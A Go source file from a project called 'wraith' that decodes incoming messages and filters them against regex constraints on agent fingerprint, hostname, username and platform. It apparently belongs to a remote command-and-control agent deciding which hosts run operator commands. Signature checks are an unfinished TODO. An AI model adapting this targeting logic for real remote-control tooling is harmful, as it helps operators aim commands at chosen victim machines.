package proto

import (
	"fmt"
	"os"
	"os/user"
	"regexp"
	"runtime"

	"github.com/0x1a8510f2/wraith/config"
)

func HandleData(data []byte) {
	// Attempt to translate data from any known format to a map[string]interface{}
	dataMap, err := DecodeGuess(data)
	if err != nil {
		// The data failed to decode (most likely didn't match any known format or the signature was invalid) so it should be discarded
		return
	}

	// The w.validity key is special - it decides whether the rest of the keys are evaluated
	// If it's present, always handle it first
	if validity, ok := dataMap["w.validity"]; ok {
		if validity, ok := validity.(map[string]string); ok {
			PartMap.Handle("w.validity", validity)
		}
	}

	// Data should now be a map[string]interface{}
	// Some data should be verified to avoid processing data which should not be processed:

	// TODO: Check if data is signed

	// Check if the data has validity constraints and if they are satisfied
	if validity, ok := dataMap["w.validity"]; ok {
		if validity, ok := validity.(map[string]string); ok {
			// Enforce validity constraints

			// Wraith Fingerprint/ID restriction
			if constraint, ok := validity["wfpt"]; ok {
				// Always fail if an ID restriction is present and Wraith has not been given an ID
				if config.Config.Wraith.Fingerprint == "" {
					return
				}
				match, err := regexp.Match(constraint, []byte(config.Config.Wraith.Fingerprint))
				if !match || err != nil {
					// If the constraint was not satisfied, the data should be dropped
					// If there was an error in checking the match, Wraith will fallback to fail
					// as to avoid running erroneous commands on every Wraith.
					return
				}
			}

			// Host Fingerprint/ID restriction
			if constraint, ok := validity["hfpt"]; ok {
				match, err := regexp.Match(constraint, []byte{}) // TODO
				if !match || err != nil {
					return
				}
			}

			// Hostname restriction
			if constraint, ok := validity["hnme"]; ok {
				hostname, err := os.Hostname()
				if err != nil {
					// Always fail if hostname could not be checked
					return
				}
				match, err := regexp.Match(constraint, []byte(hostname))
				if !match || err != nil {
					return
				}
			}

			// Running username restriction
			if constraint, ok := validity["rusr"]; ok {
				user, err := user.Current()
				if err != nil {
					return
				}
				match, err := regexp.Match(constraint, []byte(user.Username))
				if !match || err != nil {
					return
				}
			}

			// Platform (os/arch) restriction
			if constraint, ok := validity["plfm"]; ok {
				platform := fmt.Sprintf("%s|%s", runtime.GOOS, runtime.GOARCH)
				match, err := regexp.Match(constraint, []byte(platform))
				if !match || err != nil {
					return
				}
			}
		}
	}

}
